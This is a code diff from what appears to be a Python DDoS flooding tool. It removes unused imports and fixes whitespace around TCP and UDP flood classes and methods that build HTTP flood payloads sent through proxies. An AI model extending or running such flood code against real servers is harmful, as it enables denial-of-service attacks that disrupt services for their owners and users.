@@ -1,6 +1,5 @@
 import asyncio
 import random
-import re
 from contextlib import suppress
 from copy import copy
 import errno
@@ -26,17 +25,16 @@ from string import ascii_letters
 from struct import pack as data_pack
 
 import aiohttp
-import aiohttp_socks
 from async_timeout import timeout
 from cloudscraper import create_scraper
 from requests import Response, Session, cookies
 from yarl import URL
 
 from .ImpactPacket import IP, TCP, UDP, Data
-from .core import cl, logger, ROOT_DIR
+from .core import cl, logger
 from .proxies import ProxySet, NoProxySet
 
-from . import proto, proxy_proto
+from . import proxy_proto
 from .proto import FloodIO, FloodOp, FloodSpec, FloodSpecType
 from .referers import REFERERS
 from .useragents import USERAGENTS
@@ -810,7 +808,7 @@ class AsyncTcpFlood(HttpFlood):
             "\r\n"
         )
         return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)
-    
+
     async def GSB(self, on_connect) -> bool:
         payload: bytes = str.encode(
             "%s %s?qs=%s HTTP/1.1\r\n" % (self._req_type,
@@ -831,7 +829,7 @@ class AsyncTcpFlood(HttpFlood):
             'Upgrade-Insecure-Requests: 1\r\n\r\n'
         )
         return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)
-    
+
     async def NULL(self, on_connect=None) -> bool:
         payload: bytes = str.encode(
             self._payload +
@@ -1056,7 +1054,7 @@ def main(url, ip, method, event, proxies, stats, loop=None, settings=None):
 
         return AsyncUdpFlood(
             (ip, port),
-            None, # XXX: previously used for "ref"
+            None,  # XXX: previously used for "ref"
             method,
             event,
             proxies,
